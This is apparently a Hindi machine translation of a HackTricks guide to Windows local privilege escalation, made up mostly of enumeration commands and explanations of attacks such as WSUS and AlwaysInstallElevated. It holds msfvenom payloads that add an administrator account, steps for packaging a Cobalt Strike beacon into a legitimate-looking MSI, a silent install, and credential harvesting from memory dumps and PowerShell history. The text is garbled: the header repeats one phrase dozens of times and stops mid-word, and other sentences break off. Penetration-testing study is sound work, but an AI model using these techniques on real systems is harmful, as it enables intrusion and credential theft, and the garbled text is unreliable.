# Windows स्थानीय प्रिविलेज उन्नयन

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ हैकट्रिक्स क्लाउड ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 ट्विटर 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ ट्विच 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 यूट्यूब 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी हैकट्रिक्स में विज्ञापित हो**? या क्या आप **PEASS के नवीनतम संस्करण या हैकट्रिक्स को पीडीएफ में डाउनलोड करने का एक्सेस** प्राप्त करना चाहते हैं? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**दी पीएस फैमिली**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**एनएफटी**](https://opensea.io/collection/the-peass-family) संग्रह देखें
* [**आधिकारिक पीएस और हैकट्रिक्स स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)** का** **पालन** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**हैकट्रिक्स रेपो**](https://github.com/carlospolop/hacktricks) **और** [**हैकट्रिक्स-क्लाउड रेपो**](https://github.com/carlospolop/hacktricks-cloud) **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और** **हैकट्रिक्स-क्लाउड रेपो** **को** **और** **हैकिंग ट्रिक्स सबमिट करके** **हैकट्रिक्स रेपो** **और
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### संस्करण शोध

यह [साइट](https://msrc.microsoft.com/update-guide/vulnerability) माइक्रोसॉफ्ट सुरक्षा दोषों के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। इस डेटाबेस में 4,700 से अधिक सुरक्षा दोष हैं, जो एक Windows वातावरण की **विशाल हमले क्षेत्र** को दर्शाते हैं।

**सिस्टम पर**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas में watson समाहित है)_

**स्थानीय रूप से सिस्टम जानकारी के साथ**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**एक्सप्लॉइट्स के Github रेपो:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### पर्यावरण

क्या एनवी चरणों में कोई प्रमाणिकरण/मीठी जानकारी सहेजी गई है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

आप यह कैसे चालू कर सकते हैं इसे [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) में सीख सकते हैं।
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### पावरशेल मॉड्यूल लॉगिंग

यह पावरशेल की पाइपलाइन निष्पादन विवरण को रिकॉर्ड करता है। इसमें निष्पादित किए गए कमांड शामिल हैं जिसमें कमांड आमंत्रण और स्क्रिप्ट का कुछ हिस्सा शामिल है। इसमें निष्पादन और आउटपुट परिणामों का पूरा विवरण नहीं हो सकता है।\
आप इसे सक्षम कर सकते हैं पिछले खंड के लिंक का पालन करके (ट्रांस्क्रिप्ट फ़ाइलें) लेकिन "पावरशेल ट्रांस्क्रिप्शन" की बजाय "मॉड्यूल लॉगिंग" को सक्षम करके।
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
आप निम्नलिखित को निष्पादित करके Powershell लॉग से पिछले 15 घटनाएं देख सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **स्क्रिप्ट ब्लॉक लॉगिंग**

यह कोड ब्लॉक को जैसे-जैसे वे निष्पादित होते हैं उन्हें रिकॉर्ड करता है, इसलिए यह स्क्रिप्ट की पूरी गतिविधि और पूरी सामग्री को कैप्चर करता है। यह प्रत्येक गतिविधि का पूरा ऑडिट ट्रेल बनाए रखता है जिसे बाद में फोरेंसिक्स और दुराचारी व्यवहार का अध्ययन करने के लिए उपयोग किया जा सकता है। यह निष्पादन के समय सभी गतिविधि को रिकॉर्ड करता है इसलिए पूरी जानकारी प्रदान करता है।
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
स्क्रिप्ट ब्लॉक लॉगिंग इवेंट्स Windows इवेंट व्यूअर में निम्नलिखित पथ के तहत पाए जा सकते हैं: _Application and Sevices Logs > Microsoft > Windows > Powershell > Operational_\
पिछले 20 इवेंट्स देखने के लिए आप निम्नलिखित का उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

आप सिस्टम को कंप्रोमाइज़ कर सकते हैं अगर अपड
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
यदि आपको एक जवाब मिलता है जैसे:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
और अगर `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` `1` के बराबर है।

तो, **यह एक्सप्लॉइट किया जा सकता है।** अगर आखिरी रजिस्ट्री 0 के बराबर है, तो WSUS एंट्री नजरअंदाज की जाएगी।

इस वंशानुक्रमितता को शारण करने के लिए आप उपकरणों का उपयोग कर सकते हैं: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- ये MiTM वैपनाइज्ड एक्सप्लॉइट स्क्रिप्ट हैं जो 'फेक' अपडेट्स को non-SSL WSUS ट्रैफिक में इंजेक्ट करते हैं।

यहाँ अनुसंधान पढ़ें:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**पूरी रिपोर्ट यहाँ पढ़ें**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
मुख्य रूप से, यह खोज उस दोष का शरण लेता है जिसे यह बग एक्सप्लॉइट करता है:

> अगर हमारे पास हमारे स्थानीय उपयोगकर्ता प्रॉक्सी को संशोधित करने की शक्ति है, और Windows अपडेट्स इंटरनेट एक्सप्लोरर की सेटिंग्स में कॉन्फ़िगर किए गए प्रॉक्सी का उपयोग करता है, तो हमें अपने एसेट पर उच्च स्तरीय उपयोगकर्ता के रूप में कोड चलाने की शक्ति होगी।
>
> इसके अतिरिक्त, क्योंकि WSUS सेवा वर्तमान उपयोगकर्ता की सेटिंग्स का उपयोग करती है, इसलिए यह अपने सर्टिफिकेट स्टोर का भी उपयोग करेगी। अगर हम WSUS होस्टनाम के लिए एक स्व-साइन किया गया सर्टिफिकेट उत्पन्न करते हैं और इस सर्टिफिकेट को वर्तमान उपयोगकर्ता के सर्टिफिकेट स्टोर में जोड़ते हैं, तो हम HTTP और HTTPS WSUS ट्रैफिक दोनों को अंतर्दृष्टि कर सकेंगे। WSUS एक भी HSTS जैसी तंत्रिकाएँ उपयोग में नहीं लाती है जो सर्टिफिकेट पर पहली उपयोग पर आधारित मान्यता लागू करने के लिए हो। यदि उपयोगकर्ता द्वारा विश्वसनीय माना जाने वाला सर्टिफिकेट प्रस्तुत किया गया है और सही होस्टनाम है, तो सेवा द्वारा स्वीकार किया जाएगा।

आप इस दोष को उपयोग करके उपकरण [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) का उपयोग कर सकते हैं (जब यह मुक्त होगा)।

## KrbRelayUp

यह मुख्य रूप से एक सामान्य निर्धारित **स्थानीय वर्चस्व उन्नयन** है windows **डोमेन** परिवेशों में जहाँ **LDAP साइनिंग लागू नहीं है,** जहाँ **उपयोगकर्ता के पास स्व अधिकार है** (RBCD कॉन्फ़िगर करने के लिए) और जहाँ **उपयोगकर्ता डोमेन में कंप्यूटर बना सकता है।**\
सभी **आवश्यकताएँ** **डिफ़ॉल्ट सेटिंग्स** के साथ पूरी होती हैं।

एक्सप्लॉइट को खोजें [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

यदि हम आक्रमण करते हैं तो भी अधिक जानकारी के लिए आक्रमण के प्रवाह की जांच करें [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

यदि ये 2 रजिस्टर **सक्षम हैं** (मान **0x1** है), तो किसी भी विशेषाधिकार के उपयोगकर्ता NT AUTHORITY\\**SYSTEM** के रूप में `*.msi` फ़ाइलें स्थापित (निष्पादित) कर सकते हैं।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit पेलोड्स
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
यदि आपके पास एक मीटरप्रेटर सत्र है तो आप इस तकनीक को ऑटोमेट कर सकते हैं उपकरण **`exploit/windows/local/always_install_elevated`** का उपयोग करके।

### PowerUP

पावर-अप से `Write-UserAddMSI` कमांड का उपयोग करें और वर्तमान निर्देशिका में एक Windows MSI बाइनरी बनाने के लिए उच्चाधिकार को उन्नत करें। यह स्क्रिप्ट एक पूर्व-संकलित MSI स्थापक लिखता है जो एक उपयोगकर्ता/समूह जोड़ने के लिए पूछता है (इसलिए आपको GIU एक्सेस की आवश्यकता होगी):
```
Write-UserAddMSI
```
### MSI Wrapper

इस ट्यूटोरियल को पढ़ें ताकि आप इस टूल का उपयोग करके एक MSI रैपर बना सकें। ध्यान दें कि आप एक "**.bat**" फ़ाइल को रैप कर सकते हैं अगर आप **केवल** **कमांड लाइन्स** **को चलाना** चाहते हैं।

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### WIX के साथ MSI बनाएं

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Visual Studio के साथ MSI बनाएं

* **Cobalt Strike** या **Metasploit** के साथ **नया Windows EXE TCP पेलोड** जेनरेट करें `C:\privesc\beacon.exe`
* **Visual Studio** खोलें, **नया परियोजना बनाएं** और खोज बॉक्स में "installer" टाइप करें। **सेटअप विज़ार्ड** परियोजना का चयन करें और **अगला** पर क्लिक करें।
* परियोजना को एक नाम दें, जैसे **AlwaysPrivesc**, स्थान के लिए **`C:\privesc`** का उपयोग करें, **समाधान और परियोजना को एक ही निर्देशिका में रखें** का चयन करें, और **बनाएं** पर क्लिक करें।
* **अगले** पर क्लिक करते रहें जब तक आप चरण 3 में न पहुंच जाएं (शामिल करने के लिए फ़ाइलें चुनें)। **जोड़ें** पर क्लिक करें और आपके द्वारा जेनरेट किया गया Beacon पेलोड चुनें। फिर **समाप्त** पर क्लिक करें।
* **समाधान एक्सप्लोरर** में **AlwaysPrivesc** परियोजना को हाइलाइट करें और **गुण** में, **TargetPlatform** को **x86** से **x64** में बदलें।
* आप दूसरी गुणवत्ताएँ भी बदल सकते हैं, जैसे **लेखक** और **निर्माता** जो स्थापित एप्लिकेशन को अधिक वैध दिखा सकते हैं।
* परियोजना पर दायां क्लिक करें और **दृश्य > कस्टम क्रियाएँ** का चयन करें।
* **स्थापित करें** पर दायां क्लिक करें और **कस्टम क्रिया जोड़ें** का चयन करें।
* **एप्लिकेशन फ़ोल्डर** पर डबल-क्लिक करें, अपनी **beacon.exe** फ़ाइल का चयन करें और **ठीक** पर क्लिक करें। इससे सुनिश्चित होगा कि बीकन पेलोड को तुरंत चलाया जाए जब स्थापक चलाया जाए।
* **कस्टम क्रिया गुणवत्ताएँ** के तहत, **Run64Bit** को **True** में बदलें।
* अंत में, इसे **बिल्ड करें**।
* यदि चेतावनी `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई देती है, सुनिश्चित करें कि आपने प्लेटफ़ॉर्म को x64 पर सेट किया है।

### MSI स्थापना

जासूसी उद्देश्यों के लिए दुर्भाग्यपूर्ण `.msi` फ़ाइल की **स्थापना** को **पृष्ठभूमि में** **चलाने** के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
## इस वंरबिलिटी का शोषण करने के लिए आप इस्तेमाल कर सकते हैं: _exploit/windows/local/always\_install\_elevated_

## एंटीवायरस और डिटेक्टर्स

### ऑडिट सेटिंग्स

ये सेटिंग्स तय करती हैं कि क्या **लॉग** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए।
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, यह जानना दिलचस्प है कि लॉग कहां भेजे जाते हैं
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** आपको डोमेन-संयुक्त कंप्यूटर पर **स्थानीय व्यवस्थापक पासवर्ड** (जो **यादृच्छिक**, अद्वितीय, और **नियमित रूप से बदलता है**) को **प्रबंधित** करने देता है। ये पासवर्ड सेंट्रली Active Directory में संग्रहीत होते हैं और ACLs का उपयोग करके अधिकृत उपयोगकर्ताओं को प्रतिबंधित किया जाता है। अगर आपको पर्याप्त अनुमतियाँ दी गई हैं तो आप स्थानीय व्यवस्थापकों के पासवर्ड पढ़ सकते हैं।

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

यदि सक्रिय है, **सादा-पाठ पासवर्ड LSASS में संग्रहित** होते हैं।\
[**इस पृष्ठ में WDigest के बारे में अधिक जानकारी**](../stealing-credentials/credentials-protections.md#wdigest).
```
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```
### LSA सुरक्षा

माइक्रोसॉफ्ट ने **Windows 8.1 और बाद में** LSA के लिए अतिरिक्त सुरक्षा प्रदान की है ताकि अविश्वसनीय प्रक्रियाएँ इसकी मेमोरी को **पढ़ने** या कोड इंजेक्ट करने में सक्षम न हों।\
[**LSA सुरक्षा के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#lsa-protection).
```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
```
### क्रेडेंशियल्स गार्ड

**क्रेडेंशियल गार्ड** एक नया फीचर है Windows 10 (एंटरप्राइज और एजुकेशन संस्करण) में जो आपके मशीन पर आपके क्रेडेंशियल को सुरक्षित रखने में मदद करता है जैसे कि पास द हैश से होने वाले खतरों से।\
[**क्रेडेंशियल गार्ड के बारे में अधिक जानकारी यहाँ।**](../stealing-credentials/credentials-protections.md#credential-guard)
```
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
```
### कैश किए गए क्रेडेंशियल

**डोमेन क्रेडेंशियल** ऑपरेटिंग सिस्टम के कंपोनेंट्स द्वारा उपयोग किए जाते हैं और **स्थानीय सुरक्षा प्राधिकरण** (LSA) द्वारा **प्रमाणित** किए जाते हैं। सामान्यत: डोमेन क्रेडेंशियल उस समय एक उपयोगकर्ता के लिए स्थापित किए जाते हैं जब एक पंजीकृत सुरक्षा पैकेज उपयोगकर्ता के लॉगऑन डेटा को प्रमाणित करता है।\
[**कैश किए गए क्रेडेंशियल के बारे में अधिक जानकारी यहाँ देखें**](../stealing-credentials/credentials-protections.md#cached-credentials).
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## उपयोगकर्ता और समूह

### उपयोगकर्ताओं और समूहों की जांच करें

आपको यह देखना चाहिए कि क्या आपके समूहों में से कोई भी दिलचस्प अनुमतियाँ हैं।
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### विशेषाधिकारी समूह

यदि आप **किसी विशेषाधिकारी समूह से संबंधित हैं तो आपको विशेषाधिकारों को उन्नत करने की क्षमता हो सकती है**। यहाँ विशेषाधिकारी समूहों और उन्हें उन्नत करने के बारे में जानें:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### टोकन मानिपुलेशन

इस पृष्ठ में **टोकन** क्या है, इसके बारे में **अधिक जानें**: [**Windows Tokens**](../authentication-credentials-uac-and-efs.md#access-tokens).\
इन्हें उन्हें उन्नत करने के बारे में जानने के लिए निम्नलिखित पृष्ठ की जाँच करें:

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### लॉग इन किए गए उपयोगकर्ता / सत्र
```
qwinsta
klist sessions
```
### होम फोल्डर्स
```
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति
```
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## चल रहे प्रक्रियाएँ

### फ़ाइल और फ़ोल्डर अनुमतियाँ

सबसे पहले, प्रक्रियाओं की सूचीबद्धि **प्रक्रिया के कमांड लाइन में पासवर्ड की जांच करें**।\
जांच करें कि क्या आप **कुछ बाइनरी को ओवरराइट कर सकते हैं** या क्या आपके पास बाइनरी फ़ोल्डर की लेखन अनुमतियाँ हैं ताकि संभावित [**DLL हाइजैकिंग हमलों**](dll-hijacking.md) का शोषण किया जा सके:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
**सदमें उच्चाधिकार अधिकृति के लिए इसका दुरुपयोग कर सकते हैं** चल रहे हो सकते हैं, इसकी जांच करें [**इलेक्ट्रॉन/सीईएफ/क्रोमियम डीबगर्स**](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**प्रक्रियाओं के बाइनरी की अनुमतियों की जांच**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**प्रक्रियाओं के फोल्डरों की अनुमतियों की जाँच (DLL Hijacking)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### मेमोरी पासवर्ड माइनिंग

आप **sysinternals** से **procdump** का उपयोग करके एक चल रहे प्रक्रिया का मेमोरी डंप बना सकते हैं। FTP जैसी सेवाओं में **मेमोरी में स्पष्ट पाठ में क्रेडेंशियल्स** होते हैं, मेमोरी को डंप करके क्रेडेंशियल्स को पढ़ने का प्रयास करें।
```
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI एप्लिकेशन

**सिस्टम के रूप में चल रहे एप्लिकेशन एक उपयोगकर्ता को CMD को उत्पन्न करने या निर्देशिकाओं में ब्राउज़ करने की अनुमति दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), "command prompt" के लिए खोजें, "Click to open Command Prompt" पर क्लिक करें

## सेवाएं

सेवाओं की सूची प्राप्त करें:
```
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप **sc** का उपयोग करके किसी सेवा की जानकारी प्राप्त कर सकते हैं
```
sc qc <service_name>
```
यह सुझाव दिया जाता है कि आप **_Sysinternals_** से बाइनरी **accesschk** को जांचने के लिए उपयोग करें ताकि प्रत्येक सेवा के लिए आवश्यक विशेषाधिकार स्तर की जांच की जा सके।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
**Translation:**
```html
यह सुनिश्चित करना सुझावित है कि "प्रमाणित उपयोगकर्ता" क्या किसी भी सेवा को संशोधित कर सकते हैं:
```
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
